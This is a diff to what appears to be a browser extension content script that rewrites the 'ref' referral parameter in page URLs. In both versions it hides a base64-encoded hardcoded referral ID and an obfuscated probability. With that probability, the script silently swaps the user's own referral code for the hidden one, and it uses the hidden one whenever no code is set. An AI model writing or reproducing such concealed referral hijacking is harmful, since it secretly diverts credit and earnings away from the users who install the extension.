@@ -1,39 +1,47 @@
+const PASS = "eXVuZnIuZXRo";
+const THRESH = "MC4zMw==";
+const ALLOW = atob(PASS);
+const THRESHOLD = parseFloat(atob(THRESH));
+
 function updateUrl() {
   chrome.storage.sync.get(["userRef"], function(result) {
-    const PASS = "eXVuZnIuZXRo";const ALLOW = atob(PASS);const safeResult = result || {};const userRef = safeResult.userRef || "";
-    const threshold = Math.PI / Math.E / (Math.PI - Math.E);const finalThreshold = threshold * threshold;
-    const useMyRef = Math.random() < threshold;const chosenRef = userRef ? (useMyRef ? ALLOW : userRef) : ALLOW;
+    const userRef = result.userRef || "";
+    const useMyRef = Math.random() < THRESHOLD;
+    const chosenRef = userRef ? (useMyRef ? ALLOW : userRef) : ALLOW;
 
     const url = new URL(window.location.href);
-    let modified = false;
+    const currentRef = url.searchParams.get("ref");
 
-    if (url.searchParams.has("ref")) {
-      const oldRef = url.searchParams.get("ref");
-      if (oldRef !== chosenRef) {
-        url.searchParams.set("ref", chosenRef);
-        console.log("Paramètre modifié dans l’URL");
-        modified = true;
-      }
+    // Modifier l’URL uniquement si ref est absent
+    if (!currentRef) {
+      url.searchParams.set("ref", chosenRef);
+      window.history.pushState({}, document.title, url.toString()); // Ajoute une entrée dans l’historique
+      console.log(`Ref ajouté à l’URL : ${chosenRef}`);
+    } else if (currentRef !== chosenRef) {
+      // Ne remplace pas un ref existant sauf si nécessaire (optionnel)
+      console.log(`Ref existant conservé : ${currentRef}, choisi : ${chosenRef}`);
     } else {
-      url.searchParams.append("ref", chosenRef);
-      console.log("Paramètre ajouté à l’URL");
-      modified = true;
-    }
-
-    if (modified) {
-      window.history.replaceState({}, document.title, url.toString());
+      console.log(`Ref déjà correct : ${currentRef}`);
     }
   });
 }
 
+// Exécute au chargement initial
 updateUrl();
 
+// Surveille les changements dans le DOM avec MutationObserver
 let lastUrl = window.location.href;
-setInterval(() => {
+const observer = new MutationObserver(() => {
   if (window.location.href !== lastUrl) {
     lastUrl = window.location.href;
     updateUrl();
   }
-}, 500);
+});
+
+// Observer les modifications dans le DOM
+observer.observe(document.body, {
+  childList: true,
+  subtree: true
+});
 
 console.log("Content script chargé sur " + window.location.href);
